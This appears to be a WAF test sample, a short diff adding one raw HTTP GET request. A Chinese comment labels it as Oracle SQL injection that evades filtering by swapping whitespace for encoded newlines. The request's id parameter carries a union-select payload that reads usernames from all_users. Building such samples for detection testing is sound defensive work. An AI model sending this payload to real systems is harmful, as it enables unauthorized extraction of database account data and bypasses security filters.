@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_普通注入(空白符替换绕过)-06506322
+# 攻击者基于union查询使用空白符替换进行绕过，将"union%0aselect%0a1,%0ausername%0afrom%0aall_users"语句注入到 SQL 查询参数中，查询数据库中所有的用户信息。
+GET /?id=1%250aunion%250aselect%250a1%2C%250ausername%250afrom%250aall_users&bid=hd_tag_m8mv2403 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2403
+RM-PRO-Token: 390d6e99406ffff1e84d597885706284
+RM-PRO-Time: 1742808356077
+User-Agent: curl/7.83.1
+
